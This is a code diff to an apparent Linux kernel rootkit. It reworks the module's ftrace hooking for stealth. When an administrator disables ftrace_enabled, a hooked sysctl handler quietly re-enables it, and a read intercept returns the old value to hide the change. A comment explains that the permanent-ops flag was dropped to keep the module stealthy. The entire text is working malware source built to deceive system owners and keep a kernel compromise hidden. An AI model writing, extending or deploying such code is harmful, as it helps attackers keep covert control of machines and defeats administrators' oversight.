@@ -212,55 +212,51 @@ out:
     return rv;
 }
 
+static inline bool _ftrace_intercept_init(bool set) {
+    static bool _intercept_init;
+    if (set && _intercept_init == false)
+        _intercept_init = true;
+    return _intercept_init;
+}
+
+static char kv_prev_ftrace_enabled[16] = "1\n";
 static bool _ftrace_intercept(struct pt_regs *regs) {
-    static char kv_prev_ftrace_enabled[16] = "1\n";
-    int fd = PT_REGS_PARM1(regs);
+    const char __user *arg;
+    struct file *file;
+    struct path file_path;
     bool rc = false;
 
-    if (fd) {
-        const char __user *arg;
-        struct file *file;
-        struct path file_path;
+    int fd = PT_REGS_PARM1(regs);
+    if (!fd) goto out;
 
-        file = fget(fd);
-        file_path = file->f_path;
-        if (file_path.dentry && file_path.dentry->d_name.name) {
-            if (strstr(file_path.dentry->d_name.name, "ftrace")) {
+    file = fget(fd);
+    if (!file) goto out;
 
+    /** XXX: check this lock against race */
+    spin_lock(&file->f_lock);
+    file_path = file->f_path;
+    spin_unlock(&file->f_lock);
+    fput(file);
 
-                arg = (const char __user *)regs->si;
-                char current_value[16];
-                char output[] = "1\n";
+    if (file_path.dentry && file_path.dentry->d_name.name) {
+        if (strstr(file_path.dentry->d_name.name, "ftrace_enabled") &&
+                _ftrace_intercept_init(false)) {
+            char current_value[16+1] = {0};
+            char output[] = "1\n";
 
+            arg = (const char __user *)PT_REGS_PARM2(regs);
+            if (copy_from_user(current_value, (void *)arg, 16))
+                goto out;
 
-                if (copy_from_user(current_value, (void *)arg, sizeof(current_value) - 1)) {
-                    prerr("Failed to copy data from user space\n");
-                    return -EFAULT;
-                }
+            current_value[sizeof(current_value) - 1] = '\0';
+            strncpy(output, kv_prev_ftrace_enabled, sizeof(output));
+            size_t output_size = sizeof(output) - 1;
 
-
-                current_value[sizeof(current_value) - 1] = '\0';
-
-                arg = (const char __user*)PT_REGS_PARM2(regs);
-
-
-
-                if (strcmp(current_value, kv_prev_ftrace_enabled) != 0) {
-                    strncpy(kv_prev_ftrace_enabled, current_value, 1);
-                }
-
-                strncpy(output, kv_prev_ftrace_enabled, sizeof(output));
-                prinfo("output=%c kv=%c current=%s", output[0], kv_prev_ftrace_enabled[0], current_value);
-
-                size_t output_size = sizeof(output) - 1;
-                if (!copy_to_user((void*)arg, output, output_size)) {
-                    rc = true;
-                }
-            }
+            if (!copy_to_user((void*)arg, output, output_size))
+                rc = true;
         }
     }
-
-
+out:
     return rc;
 }
 
@@ -293,7 +289,7 @@ static asmlinkage long m_read(struct pt_regs *regs) {
         goto out;
 
     size = PT_REGS_PARM3(regs);
-    if (!(buf = (char *)kmalloc(size, GFP_KERNEL)))
+    if (!(buf = (char *)kzalloc(size+1, GFP_KERNEL)))
         goto out;
 
     arg = (const char __user*)PT_REGS_PARM2(regs);
@@ -941,14 +937,21 @@ static int m_proc_dointvec(struct ctl_table *table, int write,
         void *buffer, size_t *lenp, loff_t *ppos)
 #endif
 {
-    if (table && table->procname) {
-        if (!strcmp(table->procname, "ftrace_enabled"))
-            goto out;
+    int rc = real_proc_dointvec(table, write, buffer, lenp, ppos);
+    if (write) {
+        int val = *(int *)(table->data);
+
+        (void)_ftrace_intercept_init(true);
+
+        if (val == 0) {
+            *(int *)(table->data) = 1;
+            snprintf(kv_prev_ftrace_enabled, sizeof(kv_prev_ftrace_enabled), "%d\n", val);
+        } else {
+            snprintf(kv_prev_ftrace_enabled, sizeof(kv_prev_ftrace_enabled), "%d\n", val);
+        }
+
     }
-    return real_proc_dointvec(table, write, buffer, lenp, ppos);
-out:
-    /** the art of annoying */
-    return -EBUSY;
+    return rc;
 }
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
@@ -1136,18 +1139,11 @@ int fh_install_hook(struct ftrace_hook *hook) {
 
     hook->ops.func = fh_ftrace_thunk;
 
-    /**
-     * From kernel v5.5+ we can use FTRACE_OPS_FL_PERMANENT and block
-     * the disabling of ftracing.
+    /** Note: For kernels >= v5.5 there is FTRACE_OPS_FL_PERMANENT
+     *  but then we'd not be stealth.
      */
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,5,0)
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS|FTRACE_OPS_FL_RECURSION|
-        FTRACE_OPS_FL_IPMODIFY|FTRACE_OPS_FL_PERMANENT;
-#else
-    /** In older kernels we'll go via hook :( */
   hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS|FTRACE_OPS_FL_RECURSION|
       FTRACE_OPS_FL_IPMODIFY;
-#endif
 
     if ((err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0))) {
         prerr("ftrace_set_filter_ip() failed: %d\n", err);
